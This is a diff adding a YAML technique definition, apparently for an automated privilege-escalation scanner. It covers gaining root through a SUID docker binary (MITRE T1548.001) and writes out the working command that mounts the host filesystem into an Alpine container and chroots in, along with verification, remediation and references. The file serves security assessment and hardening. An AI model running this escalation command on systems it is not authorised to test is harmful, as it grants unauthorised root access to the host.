@@ -1,0 +1,31 @@
+# SUID docker → root (GTFOBins)
+technique: T1548.001
+name: SUID docker → root (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  suid: docker
+execute:
+  # Mount host / into an alpine container and chroot in — the container
+  # runs as root by default, and the mount gives full read/write to the
+  # host filesystem. `id` in that chroot prints uid=0.
+  command: "{{binary}} run -v /:/mnt --rm alpine chroot /mnt id"
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_suid
+  description: >
+    SUID docker is a root primitive by design — mount the host root
+    into a container and chroot in. The container's uid=0 becomes the
+    host's uid=0 via the mount.
+  remediation: >
+    Remove the SUID bit from docker. Docker socket access is
+    equivalent to root and should be gated through group membership
+    on a hardened socket, not blanket SUID.
+  refs: [T1548.001, GTFOBins/docker]
